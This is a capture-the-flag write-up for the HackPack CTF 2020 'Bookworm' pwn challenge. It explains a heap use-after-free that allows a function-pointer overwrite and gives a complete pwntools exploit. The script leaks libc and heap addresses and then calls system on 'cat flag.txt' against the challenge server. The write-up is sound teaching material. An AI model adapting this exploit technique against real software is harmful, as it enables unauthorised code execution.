<h1>Bookworm</h1>
<h2>HackPack CTF 2020 PWN</h2>

<h3>Problem:</h3>
Bookworm: a book collection service.

<h3>Solution:</h3>
After looking at the binary through Ghidra, we can see that there is a use after free vulnerability both with the read_summary and write_summary functions since the delete_book function never actually nulls the pointer.  Looking at how the heap is allocated and freed can help us understand how to exploit this vulnerability.

![Image of Main](https://github.com/h3lpful/ctf_writeups/blob/master/bookworm/images/vis01.PNG)

Notice that when a book is made, the address of the read_summary function is on the block just below the summary and a pointer to the summary's address is also below it.  Once this chunk is freed:

![Image of Main](https://github.com/h3lpful/ctf_writeups/blob/master/bookworm/images/vis02.PNG)

The tcachebins have the area where the function address initially was delegated for the next heap allocation.  So when we allocate another book:

![Image of Main](https://github.com/h3lpful/ctf_writeups/blob/master/bookworm/images/vis03.PNG)

The summary is now located where book 0s function call and ptr were.  This gives us as many arbitrary function calls, with a single arg, as we want.  One thing to note is that the summary can be changed, and therefore has to be smaller than 23 bytes and the title has to be over 23 bytes so that the summary of book 1 will be where the function calls of book 0 were.

Since there is no PIE we could call whatever functions are available, but I see nothing that we can use to get the flag.  This means we will need to access libc in order to call system.  One function available for us is puts, which we can feed a location on the plt to get a libc address which we can then use to calculate the libc address of system, I used puts itself.  

With this method we need one more leak, since system takes a pointer, and we can target the locations of our first book titled "cat flag.txt".  Using Ghidra to find the location of the variable bookcase, we can get a leak of the heap location the first element of the bookcase variable is pointing too, and calculate the offset to our "cat flag.txt".

Once that is done the only thing left is to build the payload.  Below is the exploit code I used:

```Python3
from pwn import *

target = './bookworm'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def insert_book(s1,name,s2,summary):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(s1)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('size:')
    p.sendline(s2)
    p.recvuntil('summary:')
    p.sendline(summary)

def delete_book(bookid):
    p.recvuntil('>>')
    p.sendline('2')
    p.sendline(bookid)

def write_sum(bookid,s1,summary):
    p.recvuntil('>>')
    p.sendline('3')
    p.sendline(bookid)
    p.sendline(s1)
    p.sendline(summary)

def call_fun(bookid):
    p.recvuntil('>>')
    p.sendline('4')
    p.sendline(bookid)

#==========================================================
#           CODE
#==========================================================

#p = process(target, env={"LD_PRELOAD":"./home/helpful/git/ctf_writeups/bookworm/libc.so.6"})
p = remote('cha.hackpack.club',41720)

#gdb.attach(p)

pl1 = p64(0x400700)      #puts call (thunk)
pl1 += p64(0x41414141)   #padding
pl1 += p64(0x602020)     #puts @got.plt

insert_book('23','cat flag.txt','23','CCCCCCCCDDDDDDDD')    # first book will also hold our cat flag.txt command for our system call
delete_book('0')                                            # free the book
insert_book('24','AAAABBBB', '23', 'GGGGGGGGHHHHHHHH')      # make new book and ensure the summary is shorter than 24 and the name is longer.  this causes the summary to be written where book 0s function calls were

write_sum('1','24',pl1)                                     # makes book 0s call a puts to the puts location on the plt
call_fun('0')

puts_leak = p.recvline()                                    # saves the leaked libc address for puts
puts_leak = puts_leak.split(b': ')[1].rstrip(b'\n')
sys_addr = int.from_bytes(puts_leak, byteorder='little')
sys_addr = sys_addr - 202112                                # calculates system address based on the difference between system and puts in the libc.so.6 binary


pl2 = p64(0x400700)                                         # second payload to leak the heap address of the first book name "cat flag.txt" 
pl2 += p64(0x42424242)
pl2 += p64(0x6020c0)

write_sum('1','24', pl2)
call_fun('0')

ptr_leak = p.recvline()
ptr_leak = ptr_leak.split(b': ')[1].rstrip(b'\n')
ptr_leak = int.from_bytes(ptr_leak, byteorder='little')


pl3 = p64(sys_addr)                                         # third payload uses both leaked addresses to call system with a ptr to the heap address of "cat flag.txt"
pl3 += p64(0x43434343)
pl3 += p64(ptr_leak - 0x40) 
        
write_sum('1','24',pl3)
call_fun('0')

print(p.recvline().split(b': ')[1].rstrip(b'\n'))

p.close()

```

flag{N0th1ng_1$_3v3r_Fr33}
